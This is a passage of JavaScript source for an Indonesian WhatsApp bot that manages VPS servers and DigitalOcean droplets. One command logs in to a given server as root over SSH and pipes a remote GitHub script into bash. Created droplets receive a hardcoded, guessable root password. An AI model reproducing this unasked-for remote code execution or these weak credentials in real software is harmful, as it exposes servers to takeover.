    ctx.fillText(`Voucher Poin: 50 POIN`, 20, y += 20);
    ctx.fillText(`Zona Waktu: Asia/Jakarta`, 20, y += 20);

    ctx.textAlign = "center";
    ctx.font = "bold 14px monospace";
    ctx.fillText("TERIMA KASIH", canvasWidth / 2, y += 40);
    ctx.fillText("TELAH BERBELANJA DI", canvasWidth / 2, y += 20);
    ctx.fillText(toko.toUpperCase(), canvasWidth / 2, y += 20);

    // QR code WA
    const qrBuffer = await qrcode.toBuffer(`https://wa.me/${nomorTujuan.replace(/^0/, '62')}`);
    const qrImage = await loadImage(qrBuffer);
    ctx.drawImage(qrImage, (canvasWidth - 100) / 2, y += 30, 100, 100);
    ctx.fillText("Scan untuk chat WA", canvasWidth / 2, y + 110);

    const filePath = `./toko/struk_${idTransaksi}.png`;
    fs.writeFileSync(filePath, canvas.toBuffer("image/png"));

    await syah.sendMessage(m.chat, { image: { url: filePath }, caption: "🧾 *Struk Pembelian*" }, { quoted: qtext });
    fs.unlinkSync(filePath);
}
break;        
case "installprotect": {
    if (!isCreator) return;
    if (!text || !text.includes("|")) return syahreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/khususprotectsyah/protectpribadi/main/syahnih.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *PROTECT* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await syahreply("Berhasil install *PROCTECT* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`1\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;
case "listown": {
    const filePath = "./library/database/owner.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada owner tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return m.reply("⚠️ *Belum ada owner tambahan!*");

    let teks = `\n*🔰 List Owner Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    syah.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: qtext });
}
break; 
case "resetpwvps": {
    if (!isCreator) return syahreply(mess.owner);
    if (!text || isNaN(text)) return syahreply("⚠️ Masukkan ID Droplet yang valid!\n\nContoh:\n.resetpwvps 123456789");

    const dropletId = text.trim();

    try {
        syah.sendMessage(m.chat, { react: { text: "♻️", key: m.key } });

        let success = false;
        let usedAkun = "";

        for (const [akunKey, apiKey] of Object.entries(global.apiDigitalOcean)) {
            if (!apiKey || apiKey.length < 64) continue;

            try {
                const response = await axios.post(
                    `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
                    { type: "password_reset" },
                    {
                        headers: {
                            Authorization: `Bearer ${apiKey}`,
                            "Content-Type": "application/json"
                        }
                    }
                );

                const action = response.data.action;
                usedAkun = akunKey;
                success = true;

                await syah.sendMessage(m.chat, {
                    text: `✅ *Berhasil Mereset Password VPS!*\n\n`
                        + `🆔 ID Droplet: *${dropletId}*\n`
                        + `📦 Akun: *${akunKey}*\n`
                        + `⚙️ Status: *${action.status}*\n`
                        + `📧 Password baru akan dikirim ke email akun DigitalOcean.`,
                }, { quoted: m });

                break; // stop loop setelah sukses
            } catch (err) {
                if (err.response && err.response.status === 404) continue; // jika droplet tidak ditemukan, coba akun berikutnya
            }
        }

        if (!success) {
            syahreply("❌ Gagal mereset password VPS.\n\nPastikan ID Droplet valid dan tersedia di salah satu akun DigitalOcean.");
        }

    } catch (err) {
        console.error("❌ ResetPW Error:", err?.response?.data || err.message);
        syahreply(`❌ Terjadi error saat mereset password:\n\n${err.message}`);
    }
}
break;

case "cvps": {
    if (!isCreator) return syahreply(mess.owner);
    if (!text) return syahreply(example("hostname"));

    let hostname = text.trim();

    try {
        const sections = [
            {
                title: "# Silahkan Pilih Salah Satu Akun DigitalOcean",
                highlight_label: "",
                rows: Object.keys(global.apiDigitalOcean).map((key, index) => {
                    let apiKey = global.apiDigitalOcean[key];
                    let isValid = apiKey && apiKey.length >= 64;

                    return {
                        header: `𝗖𝗥𝗘𝗔𝗧𝗘 𝗩𝗣𝗦 𝗩${index + 1}`,
                        title: isValid 
                            ? `Buat VPS di Akun DigitalOcean V${index + 1}` 
                            : `❌ API Key Belum Disetel`,
                        id: `${prefix}res_cvps${index + 1} ${hostname}` 
                    };
                })
            }
        ];

        const buttons = [
            {
                buttonId: "action",
                buttonText: { displayText: "🔹 Pilih Akun DigitalOcean 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
                }
            }
        ];

        const buttonMessage = {
            document: fs.readFileSync("./kenny.json"),
            mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            caption: `📌 *Mau Buat VPS di Akun DigitalOcean yang Mana?*`,
            fileName: "WYII",
            footer: `*${botname}*`,
            buttons,
            viewOnce: true,
            headerType: 1,
            contextInfo: {
                mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`],
                isForwarded: true,
                externalAdReply: {
                    containsAutoReply: true,
                    thumbnailUrl: global.image.digitalocean,
                    title: `✨ Powered By ${namaOwner}`,
                    renderLargerThumbnail: true,
                    sourceUrl: global.linkGrup,
                    mediaType: 1
                }
            }
        };

        await syah.sendMessage(m.chat, buttonMessage, { quoted: qchannel });
    } catch (error) {
        console.error("❌ Error in cvps:", error);
        return syahreply(`⚠️ Terjadi kesalahan saat mengirim pesan.\n\n${error.message}`);
    }
}
break;    

case "res_cvps1": case "res_cvps2": case "res_cvps3": case "res_cvps4": case "res_cvps5": 
case "res_cvps6": case "res_cvps7": case "res_cvps8": case "res_cvps9": case "res_cvps10": 
case "res_cvps11": case "res_cvps12": case "res_cvps13": case "res_cvps14": case "res_cvps15": 
case "res_cvps16": case "res_cvps17": case "res_cvps18": case "res_cvps19": case "res_cvps20":
case "res_cvps21":
case "res_cvps22":
case "res_cvps23":
case "res_cvps24":
case "res_cvps25":
case "res_cvps26":
case "res_cvps27":
case "res_cvps28":
case "res_cvps29":
case "res_cvps30":
case "res_cvps31":
case "res_cvps32":
case "res_cvps33":
case "res_cvps34":
case "res_cvps35":
case "res_cvps36":
case "res_cvps37":
case "res_cvps38":
case "res_cvps39":
case "res_cvps40":
case "res_cvps41":
case "res_cvps42":
case "res_cvps43":
case "res_cvps44":
case "res_cvps45":
case "res_cvps46":
case "res_cvps47":
case "res_cvps48":
case "res_cvps49":
case "res_cvps50": {
    if (!isCreator) return syahreply(mess.owner);
    if (!text) return syahreply(example("hostname"));

    let version = command.replace("res_cvps", "");
    let apikeyDO = global.apiDigitalOcean[`akun${version}`];
    let hostname = text.trim();

    if (!apikeyDO || apikeyDO.length < 64) {
        return syahreply(`🚫 *API Key di Akun DigitalOcean V${version} Tidak Valid!*`);
    }

    const sections = [
        {
            title: "# Ubuntu 20.04 (LTS) x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-20-04-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-20-04-x64` }
            ]
        },
        {
            title: "# Ubuntu 22.04 (LTS) x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-22-04-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-22-04-x64` }
            ]
        },
        {
            title: "# Ubuntu 24.04 (LTS) x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-24-04-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-24-04-x64` }
            ]
        },
        {
            title: "# Ubuntu 24.10 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},ubuntu-24-10-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},ubuntu-24-10-x64` }
            ]
        },
        {
            title: "# Debian 11 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},debian-11-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},debian-11-x64` }
            ]
        },
        {
            title: "# Debian 12 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},debian-12-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},debian-12-x64` }
            ]
        },
        {
            title: "# CentOS Stream 9 x64",
            highlight_label: "",
            rows: [
                { title: "💻 RAM 1GB | CPU 1 Core", id: `${prefix}r1c1_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 2GB | CPU 1 Core", id: `${prefix}r2c1_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 2GB | CPU 2 Core", id: `${prefix}r2c2_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 4GB | CPU 2 Core", id: `${prefix}r4c2_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 8GB | CPU 4 Core", id: `${prefix}r8c4_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 16GB | CPU 4 Core", id: `${prefix}r16c4_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 16GB | CPU 8 Core", id: `${prefix}r16c8_v${version} ${hostname},centos-stream-9-x64` },
                { title: "💻 RAM 32GB | CPU 8 Core", id: `${prefix}r32c8_v${version} ${hostname},centos-stream-9-x64` }
            ]
        }
    ];

    const buttons = [
        {
            buttonId: "action",
            buttonText: { displayText: "🔹 Pilih Spesifikasi 🔹" },
            type: 4,
            nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({ title: "𝗞𝗟𝗜𝗞 𝗗𝗜 𝗦𝗜𝗡𝗜", sections })
            }
        }
    ];

    const message = {
        text: `📌 *Pilih Spesifikasi VPS yang Tersedia*`,
        footer: `*Akun DigitalOcean V${version}*`,
        headerType: 1,
        viewOnce: true,
        buttons,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender, `${global.owner}@s.whatsapp.net`]
        }
    };

    return syah.sendMessage(m.chat, message, { quoted: qfake });
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "r1c1_v1": case "r2c1_v1": case "r2c2_v1": case "r4c2_v1": case "r8c4_v1": case "r16c4_v1": case "r16c8_v1": case "r32c8_v1": 
case "r1c1_v2": case "r2c1_v2": case "r2c2_v2": case "r4c2_v2": case "r8c4_v2": case "r16c4_v2": case "r16c8_v2": case "r32c8_v2": 
case "r1c1_v3": case "r2c1_v3": case "r2c2_v3": case "r4c2_v3": case "r8c4_v3": case "r16c4_v3": case "r16c8_v3": case "r32c8_v3": 
case "r1c1_v4": case "r2c1_v4": case "r2c2_v4": case "r4c2_v4": case "r8c4_v4": case "r16c4_v4": case "r16c8_v4": case "r32c8_v4": 
case "r1c1_v5": case "r2c1_v5": case "r2c2_v5": case "r4c2_v5": case "r8c4_v5": case "r16c4_v5": case "r16c8_v5": case "r32c8_v5": 
case "r1c1_v6": case "r2c1_v6": case "r2c2_v6": case "r4c2_v6": case "r8c4_v6": case "r16c4_v6": case "r16c8_v6": case "r32c8_v6": 
case "r1c1_v7": case "r2c1_v7": case "r2c2_v7": case "r4c2_v7": case "r8c4_v7": case "r16c4_v7": case "r16c8_v7": case "r32c8_v7": 
case "r1c1_v8": case "r2c1_v8": case "r2c2_v8": case "r4c2_v8": case "r8c4_v8": case "r16c4_v8": case "r16c8_v8": case "r32c8_v8": 
case "r1c1_v9": case "r2c1_v9": case "r2c2_v9": case "r4c2_v9": case "r8c4_v9": case "r16c4_v9": case "r16c8_v9": case "r32c8_v9": 
case "r1c1_v10": case "r2c1_v10": case "r2c2_v10": case "r4c2_v10": case "r8c4_v10": case "r16c4_v10": case "r16c8_v10": case "r32c8_v10": 
case "r1c1_v11": case "r2c1_v11": case "r2c2_v11": case "r4c2_v11": case "r8c4_v11": case "r16c4_v11": case "r16c8_v11": case "r32c8_v11": 
case "r1c1_v12": case "r2c1_v12": case "r2c2_v12": case "r4c2_v12": case "r8c4_v12": case "r16c4_v12": case "r16c8_v12": case "r32c8_v12": 
case "r1c1_v13": case "r2c1_v13": case "r2c2_v13": case "r4c2_v13": case "r8c4_v13": case "r16c4_v13": case "r16c8_v13": case "r32c8_v13": 
case "r1c1_v14": case "r2c1_v14": case "r2c2_v14": case "r4c2_v14": case "r8c4_v14": case "r16c4_v14": case "r16c8_v14": case "r32c8_v14": 
case "r1c1_v15": case "r2c1_v15": case "r2c2_v15": case "r4c2_v15": case "r8c4_v15": case "r16c4_v15": case "r16c8_v15": case "r32c8_v15": 
case "r1c1_v16": case "r2c1_v16": case "r2c2_v16": case "r4c2_v16": case "r8c4_v16": case "r16c4_v16": case "r16c8_v16": case "r32c8_v16": 
case "r1c1_v17": case "r2c1_v17": case "r2c2_v17": case "r4c2_v17": case "r8c4_v17": case "r16c4_v17": case "r16c8_v17": case "r32c8_v17": 
case "r1c1_v18": case "r2c1_v18": case "r2c2_v18": case "r4c2_v18": case "r8c4_v18": case "r16c4_v18": case "r16c8_v18": case "r32c8_v18": 
case "r1c1_v19": case "r2c1_v19": case "r2c2_v19": case "r4c2_v19": case "r8c4_v19": case "r16c4_v19": case "r16c8_v19": case "r32c8_v19": 
case "r1c1_v20": case "r2c1_v20": case "r2c2_v20": case "r4c2_v20": case "r8c4_v20": case "r16c4_v20": case "r16c8_v20": case "r32c8_v20":
case "r1c1_v21": case "r2c1_v21": case "r2c2_v21": case "r4c2_v21": case "r8c4_v21": case "r16c4_v21": case "r16c8_v21": case "r32c8_v21":
case "r1c1_v22": case "r2c1_v22": case "r2c2_v22": case "r4c2_v22": case "r8c4_v22": case "r16c4_v22": case "r16c8_v22": case "r32c8_v22":
case "r1c1_v23": case "r2c1_v23": case "r2c2_v23": case "r4c2_v23": case "r8c4_v23": case "r16c4_v23": case "r16c8_v23": case "r32c8_v23":
case "r1c1_v24": case "r2c1_v24": case "r2c2_v24": case "r4c2_v24": case "r8c4_v24": case "r16c4_v24": case "r16c8_v24": case "r32c8_v24":
case "r1c1_v25": case "r2c1_v25": case "r2c2_v25": case "r4c2_v25": case "r8c4_v25": case "r16c4_v25": case "r16c8_v25": case "r32c8_v25":
case "r1c1_v26":
case "r2c1_v26":
case "r2c2_v26":
case "r4c2_v26":
case "r8c4_v26":
case "r16c4_v26":
case "r16c8_v26":
case "r32c8_v26":
case "r1c1_v27":
case "r2c1_v27":
case "r2c2_v27":
case "r4c2_v27":
case "r8c4_v27":
case "r16c4_v27":
case "r16c8_v27":
case "r32c8_v27":
case "r1c1_v28":
case "r2c1_v28":
case "r2c2_v28":
case "r4c2_v28":
case "r8c4_v28":
case "r16c4_v28":
case "r16c8_v28":
case "r32c8_v28":
case "r1c1_v29":
case "r2c1_v29":
case "r2c2_v29":
case "r4c2_v29":
case "r8c4_v29":
case "r16c4_v29":
case "r16c8_v29":
case "r32c8_v29":
case "r1c1_v30":
case "r2c1_v30":
case "r2c2_v30":
case "r4c2_v30":
case "r8c4_v30":
case "r16c4_v30":
case "r16c8_v30":
case "r32c8_v30":
case "r1c1_v31":
case "r2c1_v31":
case "r2c2_v31":
case "r4c2_v31":
case "r8c4_v31":
case "r16c4_v31":
case "r16c8_v31":
case "r32c8_v31":
case "r1c1_v32":
case "r2c1_v32":
case "r2c2_v32":
case "r4c2_v32":
case "r8c4_v32":
case "r16c4_v32":
case "r16c8_v32":
case "r32c8_v32":
case "r1c1_v33":
case "r2c1_v33":
case "r2c2_v33":
case "r4c2_v33":
case "r8c4_v33":
case "r16c4_v33":
case "r16c8_v33":
case "r32c8_v33":
case "r1c1_v34":
case "r2c1_v34":
case "r2c2_v34":
case "r4c2_v34":
case "r8c4_v34":
case "r16c4_v34":
case "r16c8_v34":
case "r32c8_v34":
case "r1c1_v35":
case "r2c1_v35":
case "r2c2_v35":
case "r4c2_v35":
case "r8c4_v35":
case "r16c4_v35":
case "r16c8_v35":
case "r32c8_v35":
case "r1c1_v36":
case "r2c1_v36":
case "r2c2_v36":
case "r4c2_v36":
case "r8c4_v36":
case "r16c4_v36":
case "r16c8_v36":
case "r32c8_v36":
case "r1c1_v37":
case "r2c1_v37":
case "r2c2_v37":
case "r4c2_v37":
case "r8c4_v37":
case "r16c4_v37":
case "r16c8_v37":
case "r32c8_v37":
case "r1c1_v38":
case "r2c1_v38":
case "r2c2_v38":
case "r4c2_v38":
case "r8c4_v38":
case "r16c4_v38":
case "r16c8_v38":
case "r32c8_v38":
case "r1c1_v39":
case "r2c1_v39":
case "r2c2_v39":
case "r4c2_v39":
case "r8c4_v39":
case "r16c4_v39":
case "r16c8_v39":
case "r32c8_v39":
case "r1c1_v40":
case "r2c1_v40":
case "r2c2_v40":
case "r4c2_v40":
case "r8c4_v40":
case "r16c4_v40":
case "r16c8_v40":
case "r32c8_v40":
case "r1c1_v41":
case "r2c1_v41":
case "r2c2_v41":
case "r4c2_v41":
case "r8c4_v41":
case "r16c4_v41":
case "r16c8_v41":
case "r32c8_v41":
case "r1c1_v42":
case "r2c1_v42":
case "r2c2_v42":
case "r4c2_v42":
case "r8c4_v42":
case "r16c4_v42":
case "r16c8_v42":
case "r32c8_v42":
case "r1c1_v43":
case "r2c1_v43":
case "r2c2_v43":
case "r4c2_v43":
case "r8c4_v43":
case "r16c4_v43":
case "r16c8_v43":
case "r32c8_v43":
case "r1c1_v44":
case "r2c1_v44":
case "r2c2_v44":
case "r4c2_v44":
case "r8c4_v44":
case "r16c4_v44":
case "r16c8_v44":
case "r32c8_v44":
case "r1c1_v45":
case "r2c1_v45":
case "r2c2_v45":
case "r4c2_v45":
case "r8c4_v45":
case "r16c4_v45":
case "r16c8_v45":
case "r32c8_v45":
case "r1c1_v46":
case "r2c1_v46":
case "r2c2_v46":
case "r4c2_v46":
case "r8c4_v46":
case "r16c4_v46":
case "r16c8_v46":
case "r32c8_v46":
case "r1c1_v47":
case "r2c1_v47":
case "r2c2_v47":
case "r4c2_v47":
case "r8c4_v47":
case "r16c4_v47":
case "r16c8_v47":
case "r32c8_v47":
case "r1c1_v48":
case "r2c1_v48":
case "r2c2_v48":
case "r4c2_v48":
case "r8c4_v48":
case "r16c4_v48":
case "r16c8_v48":
case "r32c8_v48":
case "r1c1_v49":
case "r2c1_v49":
case "r2c2_v49":
case "r4c2_v49":
case "r8c4_v49":
case "r16c4_v49":
case "r16c8_v49":
case "r32c8_v49":
case "r1c1_v50":
case "r2c1_v50":
case "r2c2_v50":
case "r4c2_v50":
case "r8c4_v50":
case "r16c4_v50":
case "r16c8_v50":
case "r32c8_v50": {
    if (!isCreator) return syahreply(mess.owner);
    
    let [commandBase, version] = command.split("_v");
    let apiDigitalOcean = global.apiDigitalOcean[`akun${version}`];

    let [hostname, os, region] = text.toLowerCase().trim().split(",");
    let images, karanjut;

    if (!region) {
        return syah.sendMessage(m.chat, {
            buttons: [{
                buttonId: "action",
                buttonText: { displayText: "🔹 Silahkan Pilih Region VPS 🔹" },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "Pilih Region VPS",
                        sections: [{
                            title: "# Silahkan Pilih Salah Satu Region Yang Tersedia",
                            highlight_label: "Populer",
                            rows: [
                                { title: "🇸🇬 Singapore", id: `${cmd} ${hostname},${os},sgp1` },
                                { title: "🇺🇸 New York", id: `${cmd} ${hostname},${os},nyc3` },
                                { title: "🇺🇸 San Francisco", id: `${cmd} ${hostname},${os},sfo3` },
                                { title: "🇳🇱 Amsterdam", id: `${cmd} ${hostname},${os},ams3` },
                                { title: "🇬🇧 London", id: `${cmd} ${hostname},${os},lon1` },
                                { title: "🇩🇪 Frankfurt", id: `${cmd} ${hostname},${os},fra1` },
                                { title: "🇨🇦 Toronto", id: `${cmd} ${hostname},${os},tor1` },
                                { title: "🇮🇳 Bangalore", id: `${cmd} ${hostname},${os},blr1` },
                                { title: "🇦🇺 Sydney", id: `${cmd} ${hostname},${os},syd1` }
                            ]
                        }]
                    })
                }
            }],
            footer: `*Akun DigitalOcean V${version}*`,
            headerType: 1,
            viewOnce: true,
            text: "Silakan Pilih Region VPS Yang Akan Dibuat",
            contextInfo: { isForwarded: true }
        }, { quoted: qfake });
    }
    
    switch (commandBase) {
        case "r1c1": images = "s-1vcpu-1gb-amd"; karanjut = "#1GB"; break;
        case "r2c1": images = "s-1vcpu-2gb-amd"; karanjut = "#2GB"; break;
        case "r2c2": images = "s-2vcpu-2gb-amd"; karanjut = "#2GB"; break;
        case "r4c2": images = "s-2vcpu-4gb-amd"; karanjut = "#4GB"; break;
        case "r8c4": images = "s-4vcpu-8gb-amd"; karanjut = "#8GB"; break;
        case "r16c4": images = "s-4vcpu-16gb-amd"; karanjut = "#16GB"; break;
        case "r16c8": images = "s-8vcpu-16gb-amd"; karanjut = "#16GB"; break;
        case "r32c8": images = "s-8vcpu-32gb-amd"; karanjut = "#32GB"; break;
        default: return kirim("❌ Spesifikasi VPS tidak valid.");
    }

    if (!isCreator) return;
    let password =`qwertyxyzjuzqrxa${karanjut}`;
   
    try {
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: os,
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                "Authorization": `Bearer ${apiDigitalOcean}`
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            await syah.sendMessage(m.chat, {
                text: `⏳ Memproses pembuatan VPS, mohon tunggu 1 menit...`,
                mentions: [m.sender],
                contextInfo: {
                    externalAdReply: {
                        title: botname,
                        body: `© Powered by ${namaOwner}`,
                        thumbnailUrl: global.image.reply,
                        sourceUrl: global.linkGrup
                    }
                }
            });
            await new Promise(resolve => setTimeout(resolve, 60000));

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    "Authorization": `Bearer ${apiDigitalOcean}`
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let aturannya = `============================
𝗚𝗔𝗥𝗔𝗡𝗦𝗜 𝗗𝗗𝗢𝗦 𝟭𝟬 𝗛𝗔𝗥𝗜 𝗔𝗣𝗔𝗕𝗜𝗟𝗔 𝗧𝗜𝗗𝗔𝗞 𝗠𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗥 𝗧.𝗢.𝗦
============================

⚠️ 𝐓.𝐎.𝐒 𝐕𝐏𝐒 
-ᴀᴛᴜʀᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ᴘᴇɴɢɢᴜɴᴀᴀɴ ᴅɪʟᴀʀᴀɴɢ:
 •ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴅᴅᴏꜱ / ᴅᴏꜱ
 •ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴄʀᴀᴄᴋɪɴɢ, ᴘʜɪꜱɪɴɢ, ʜᴀᴄᴋɪɴɢ, ꜱᴄᴀᴍ, ᴅᴀɴ ᴄʏʙᴇʀ ᴄʀɪᴍᴇ ʟᴀɪɴɴʏᴀ 
 •ᴅɪɢᴜɴᴀᴋᴀɴ ᴜɴᴛᴜᴋ ᴍɪɴɴɪɴɢ ᴄʀʏᴘᴛᴏᴄᴜʀʀᴇɴᴄʏ
 •ᴘᴇɴʏᴇʙᴀʀᴀɴ ᴍᴀʟᴡᴀʀᴇ, ꜱᴘᴀᴍ ᴇᴍᴀɪʟ, ᴀᴛᴀᴜ ᴠɪʀᴜꜱ
 •ʜᴏꜱᴛɪɴɢ ᴋᴏɴᴛᴇɴ ɪʟᴇɢᴀʟ ᴅᴀɴ ʙᴀᴊᴀᴋᴀɴ
